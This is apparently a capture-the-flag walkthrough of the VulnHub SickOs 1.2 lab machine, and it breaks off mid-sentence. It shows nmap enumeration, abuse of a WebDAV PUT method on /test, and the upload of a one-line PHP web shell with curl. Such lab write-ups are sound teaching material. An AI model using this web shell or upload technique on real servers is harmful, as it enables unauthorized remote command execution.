# SickOs: 1.2

## 1.Get VM IP :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/8e84c627-dcce-4e28-9a2b-7f5309b7fc65)

The ip address is `192.168.127.230`, let's scan it.

## 2.Enumeration

```bash
Nmap scan report for 192.168.127.230
Host is up (0.00047s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:67:CE:D7 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting the web application has nothing :
- no robots.txt
- no special directory
- no nikto special results
- no directory traversal vector
- no session management
- no exploit for `lighttpd 1.4.28`

the only useful information from nikto is `/test` directory

this directory is a simple directory listing and has nothing interesting, but if we curl to this page :

```bash
root@kali: curl http://192.168.127.230/test -X OPTIONS -v

*   Trying 192.168.127.230:80...
* Connected to 192.168.127.230 (192.168.127.230) port 80
> OPTIONS /test HTTP/1.1
> Host: 192.168.127.230
> User-Agent: curl/8.3.0
> Accept: */*
> 
< HTTP/1.1 301 Moved Permanently
< DAV: 1,2
< MS-Author-Via: DAV
< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
< Location: http://192.168.127.230/test/
< Content-Length: 0
< Date: Wed, 25 Oct 2023 17:00:21 GMT
< Server: lighttpd/1.4.28
< 
* Connection #0 to host 192.168.127.230 left intact
```

 we can see that allowed methods are strang and one of them is put, so we can simply test if we can upload a file here :

 ```bash
root@kali: curl 192.168.127.230/test/ -X PUT -T ./file.txt -v

*   Trying 192.168.127.230:80...
* Connected to 192.168.127.230 (192.168.127.230) port 80
> PUT /test/file.txt HTTP/1.1
> Host: 192.168.127.230
> User-Agent: curl/8.3.0
> Accept: */*
> Content-Length: 0
> 
< HTTP/1.1 200 OK
< Content-Length: 0
< Date: Wed, 25 Oct 2023 17:07:43 GMT
< Server: lighttpd/1.4.28
< 
* Connection #0 to host 192.168.127.230 left intact
```

 and yes we uploaded our file into the /test directory:

 ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/496d9819-6b06-48ec-8ccb-cd4c45b58a7f)

now we can check to upload a php file to send command, i made a file called `shell.php` with the following content :

```php
<?php system($_GET["cmd"]);
```
and uploaded it :

```bash
root@kali: curl 192.168.127.230/test/ -X PUT -T ./shell.php -v

*   Trying 192.168.127.230:80...
* Connected to 192.168.127.230 (192.168.127.230) port 80
> PUT /test/shell.php HTTP/1.1
> Host: 192.168.127.230
> User-Agent: curl/8.3.0
> Accept: */*
> Content-Length: 28
> 
* We are completely uploaded and fine
< HTTP/1.1 201 Created
< Content-Length: 0
< Date: Wed, 25 Oct 2023 17:12:08 GMT
< Server: lighttpd/1.4.28
< 
* Connection #0 to host 192.168.127.230 left intact
```
 and yes we uploaded the file :

 ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/1eea3aca-eb29-4136-a03f-c8fafd9bf618)


now le








